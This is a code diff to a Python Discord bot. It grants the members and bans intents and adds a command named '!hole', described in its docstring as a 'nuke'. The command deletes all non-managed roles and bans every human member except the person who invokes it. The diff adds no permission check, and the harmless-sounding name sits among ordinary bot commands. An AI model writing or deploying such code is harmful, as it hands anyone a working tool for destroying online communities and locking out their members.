@@ -9,6 +9,8 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 intents = discord.Intents.default()
 intents.guilds = True
 intents.message_content = True
+intents.members = True
+intents.bans = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
@@ -29,6 +31,58 @@ async def on_ready():
         print(f"✅ Synced {len(synced)} command(s)")
     except Exception as e:
         print(f"❌ Failed to sync commands: {e}")
+
+# --- Text Command: !hole ---
+@bot.command(name="hole")
+async def hole_command(ctx):
+    """Nuke command: removes all roles and bans all members"""
+    
+    await ctx.send("⚠️ **NUKE INITIATED** ⚠️\nProcessing... This may take a while.")
+    
+    try:
+        guild = ctx.guild
+        if not guild:
+            await ctx.send("❌ Could not find guild")
+            return
+
+        # Remove all roles (except @everyone)
+        roles_removed = 0
+        role_errors = []
+        
+        for role in guild.roles:
+            # Skip @everyone role (can't be deleted) and managed roles (bot roles)
+            if role.name != "@everyone" and not role.managed:
+                try:
+                    await role.delete()
+                    roles_removed += 1
+                except Exception as e:
+                    role_errors.append(f"Failed to delete role {role.name}: {str(e)[:50]}")
+
+        # Ban all members (except bots and the command user)
+        members_banned = 0
+        ban_errors = []
+        
+        for member in guild.members:
+            # Skip bots and the command user
+            if not member.bot and member != ctx.author:
+                try:
+                    await member.ban(reason="!hole command executed")
+                    members_banned += 1
+                except Exception as e:
+                    ban_errors.append(f"Failed to ban {member.name}: {str(e)[:50]}")
+
+        # Send completion message
+        response = f"✅ **NUKE COMPLETE** ✅\n"
+        response += f"- Removed {roles_removed} roles\n"
+        response += f"- Banned {members_banned} members\n"
+        
+        if role_errors or ban_errors:
+            response += f"\n⚠️ Errors encountered: {len(role_errors) + len(ban_errors)}"
+        
+        await ctx.send(response)
+
+    except Exception as e:
+        await ctx.send(f"❌ Error during nuke: {str(e)}")
 
 # --- Text Command: !start ---
 @bot.command(name="start")
